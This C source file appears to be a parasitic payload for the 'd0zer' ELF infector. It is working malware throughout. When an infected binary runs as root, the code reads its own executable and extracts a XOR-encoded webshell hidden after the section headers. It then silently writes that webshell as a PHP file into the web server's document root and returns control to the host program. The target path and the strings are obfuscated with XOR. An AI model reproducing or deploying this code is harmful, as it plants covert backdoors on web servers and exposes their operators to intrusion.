/*
 * gcc -nostdlib -fno-stack-protector -fPIC d0zercron.c -o d0zercron -O0
 */

#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <linux/limits.h>

#define XOR_KEY 0x01

long __open(const char *pathname, int flags, int mode);
long __write(int fd, const void *buf, size_t count);
long __read(int fd, void *buf, size_t count);
long __close(int fd);
void *__mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
long __munmap(void *addr, size_t len);
long __stat(const char *path, struct stat *f_info);
long __readlink(const char *path, const char *buf, size_t size);
long __access(const char *path, int mode);
long __geteuid();

size_t __strlen(const char *s);
void *__malloc(size_t len);
void __strncpy(char *restrict dest, const char *src, size_t n);

extern unsigned long end_vx;
void real_start();

void decrypt_xor(char *encrypted_str, char *decrypted_str);
char *get_self_path();
char *create_full_path(char *directory, char *filename);

void write_payload(void *self_mem, uint64_t p_offset, uint64_t p_size);

void __attribute__((naked)) _start()
{
	real_start();
	__asm__ __volatile__("jmp end_code");
}


void real_start()
{
	int self_fd = -1;
	uint64_t f_end;
	struct stat f_info;
	void *self_mem = NULL;
	char *self_path = NULL;

	Elf64_Ehdr *e_hdr;
	if(__geteuid())
		return;
	if((self_path = get_self_path()) == NULL)
		return;

	if((self_fd = __open(self_path, O_RDONLY,0)) < 0 )
		goto clean_up;

	if(__stat(self_path, &f_info) < 0)
		goto clean_up;

	if((self_mem = __malloc(f_info.st_size)) == NULL)
		goto clean_up;

	if(__read(self_fd, self_mem, f_info.st_size) != f_info.st_size)
		goto clean_up;

	e_hdr = (Elf64_Ehdr*)self_mem;

	/*
		If the st_size is equal to the calculated size of the file based on
	    the presumption that the structure header table is at the end of the file
	    then we will know that there is not an embedded configuration, so we
	    exit and transfer control back to the original program.
	*/

	f_end = e_hdr->e_shoff + (e_hdr->e_shnum * e_hdr->e_shentsize);
	if(f_info.st_size == f_end)
		goto clean_up;

	write_payload(self_mem, f_end, f_info.st_size - f_end);
	clean_up:
		if(self_fd > 0)
			__close(self_fd);
		if(self_path != NULL)
			__munmap(self_path, PATH_MAX);
		if(self_mem != NULL)
			__munmap(self_mem, f_info.st_size);

}

void decrypt_xor(char *encrypted_str, char *decrypted_str)
{
	uint8_t key = XOR_KEY;
	char *d_ptr = decrypted_str;
	while(*encrypted_str != '\0')
		*d_ptr++ = *encrypted_str++ ^ key;
	*d_ptr = '\0';
}

#define ENC_TARGET_DIR ".w`s.vvv.iulm"
#define TARGET_DIR_LEN __strlen(ENC_TARGET_DIR) + 1

#define ENC_FILENAME "do,tr/qiq"
#define FILENAME_LEN __strlen(ENC_FILENAME) + 1

void write_payload(void *self_mem, uint64_t  p_offset, uint64_t p_size)
{
	int fd = -1;
	char *webshell = NULL;
	char *full_path = NULL;
	char d_directory[TARGET_DIR_LEN];
	char d_fname[FILENAME_LEN];
	char enc_target_dir[] = ENC_TARGET_DIR;
	char enc_filename[] = ENC_FILENAME;

	decrypt_xor(enc_target_dir, d_directory);
	decrypt_xor(enc_filename, d_fname);
	full_path = create_full_path(d_directory, d_fname);
	if(full_path == NULL)
		goto end;
	if(__access(full_path, F_OK) == 0)
		goto end;
	if((webshell = __malloc(p_size)) == NULL)
		goto end;

	__strncpy(webshell, (char *)(self_mem + p_offset), p_size);
	for(int i = 0; i < p_size; i++)
		webshell[i] = webshell[i] ^ XOR_KEY;

	if((fd = __open(full_path, O_CREAT | O_WRONLY, 0755)) < 0)
		goto end;

	__write(fd, webshell, p_size);

	end:
	if (fd > 0)
		__close(fd);
	if(full_path != NULL)
		__munmap(full_path, __strlen(full_path));
	if(webshell != NULL)
		__munmap(webshell, p_size);

}

char *create_full_path(char *directory, char *filename)
{
	char *absolute_path;
	size_t filename_len = __strlen(filename);
	size_t dir_len = __strlen(directory);
	size_t allocatation_size  = __strlen(directory) + filename_len;

	// 1 byte for null terminator and 1 byte for '/' appended to directory
	allocatation_size += 2;
	if((absolute_path = __malloc(allocatation_size)) == NULL)
		return NULL;

	__strncpy(absolute_path, directory, allocatation_size);

	absolute_path[dir_len++] = '/';
	__strncpy(absolute_path + dir_len, filename, filename_len);
	absolute_path[allocatation_size] = '\0';

	return absolute_path;
}

size_t __strlen(const char *s)
{
	size_t len = 0;
	while(*s++ != '\0')
		len++;

	return len;
}

void *__malloc(size_t len)
{
	void *mem;
	mem = __mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
	return mem;
}

void __strncpy(char *restrict dest, const char *src, size_t n)
{
	while(n-- && *src != '\0')
		*dest++ = *src++;
	*dest  = '\0';
}

int __strncmp(const char *s1, const char *s2, size_t n)
{
	int diff = 0;
	for(size_t i = 0; i < n; i++) {
		diff = (unsigned char)(*s1++) - (unsigned char)(*s2++);
		if(diff != 0 || *s1 == '\0')
			break;
	}
	return diff;
}

char *get_self_path()
{
	size_t path_len;
	size_t proc_path_len;
	char encrypted_proc_slash_self_exe[] = ".qsnb.rdmg.dyd";
	proc_path_len = __strlen(encrypted_proc_slash_self_exe) + 1;
	char *proc_slash_self_exe = __malloc(proc_path_len);
	char *self_path_buf = __malloc(PATH_MAX);

	if(self_path_buf) {
		decrypt_xor(encrypted_proc_slash_self_exe, proc_slash_self_exe);
		path_len = __readlink(proc_slash_self_exe, self_path_buf, PATH_MAX);
		self_path_buf[path_len] = '\0';
	}
	__munmap(proc_slash_self_exe, proc_path_len);
	return self_path_buf;
}

#define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));

#define __open_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $2, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3) \
                                        : "%rax", "%rdi", "%rsi", "%rdx" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __write_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
	{ \
		type ret; \
		__asm__ __volatile__ (\
				"movq $1, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
           			      : \
				      : "g" (arg1), "g" (arg2), "g" (arg3) \
				      : "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __read_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) \
	{ \
		type ret; \
		__asm__ __volatile__ (\
				"movq $0, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
					: \
					: "g" (arg1), "g" (arg2), "g" (arg3) \
					: "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __close_syscall(type, name, arg1, arg1_type) \
        type name(arg1_type arg1) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $3, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1) \
                                        : "%rax", "%rdi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __mmap_syscall(type, name, arg1, arg1_type, arg2,  arg2_type, arg3, arg3_type, arg4, arg4_type, arg5, arg5_type, arg6, arg6_type) \
        type name(arg1_type arg1, arg2_type arg2, arg3_type arg3, arg4_type arg4, arg5_type arg5, arg6_type arg6) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $9, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "movq %2, %%rdx\n" \
                                "movq %3, %%r10\n" \
                                "movq %4, %%r8\n" \
                                "movq %5, %%r9\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2), "g" (arg3), "g" (arg4), "g" (arg5), "g" (arg6) \
                                        : "%rax", "%rdi", "%rsi", "%rdx", "%r10", "%r8", "%r9" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __munmap_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) \
		{ \
                type ret; \
                __asm__ __volatile__(\
                                "movq $11, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __stat_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
        type name(arg1_type arg1, arg2_type arg2) { \
                type ret; \
                __asm__ __volatile__(\
                                "movq $4, %%rax\n" \
                                "movq %0, %%rdi\n" \
                                "movq %1, %%rsi\n" \
                                "syscall" \
                                        : \
                                        : "g" (arg1), "g" (arg2) \
                                        : "%rax", "%rdi", "%rsi" \
                ); \
                __load_syscall_ret(ret); \
                return ret; \
        }

#define __readlink_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
		type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
                type ret; \
                __asm__ __volatile__( \
                				"movq $89, %%rax\n" \
                				"movq %0, %%rdi\n" \
                				"movq %1, %%rsi\n" \
                				"movq %2, %%rdx\n" \
                				"syscall" \
                				: \
                				: "g" (arg1), "g" (arg2), "g" (arg3) \
                				: "%rax", "%rdi", "%rsi", "%rdx" \
        		); \
        		__load_syscall_ret(ret); \
        		return ret; \
        }

#define __access_syscall(type, name, arg1, arg1_type, arg2, arg2_type) \
	type name(arg1_type arg1, arg2_type arg2) { \
		type ret; \
        __asm__ __volatile__( \
						"movq $21, %%rax\n" \
						"movq %0, %%rdi\n" \
						"movq $1, %%rsi\n" \
						"syscall" \
						: \
						: "g" (arg1), "g" (arg2) \
						: "%rax", "%rdi", "%rsi" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

#define __geteuid_syscall(type, name) \
	type name() { \
    type ret; \
	__asm__ __volatile__( \
    				"movq $107, %%rax\n" \
					"syscall" \
					: \
					: \
					: "%rax" \
	); \
    __load_syscall_ret(ret); \
	return ret; \
}

__open_syscall(long, __open, pathname, const char *, flags, int, mode, int);
__write_syscall(long, __write, fd, int, buf, const void *, count, size_t);
__read_syscall(long, __read, fd, int, buf, void *, count, size_t);
__close_syscall(long, __close, fd, int);
__mmap_syscall(void *, __mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
__munmap_syscall(long, __munmap, addr, void *, len, size_t);
__stat_syscall(long, __stat, path, const char *, f_info, struct stat *);
__readlink_syscall(long, __readlink, pathname, const char *restrict, buf, const char *restrict, size, size_t);
__access_syscall(long, __access, pathname, const char *, mode, int);
__geteuid_syscall(long, __geteuid);

/*
 * No additional code beyond end_code(), d0zer appends a restoration stub here, unless you handle restoration
 * (transfering execution back to the non-parasitic code) with -noRestoration flag in d0zer.
 */
__attribute__((naked)) void end_code() {}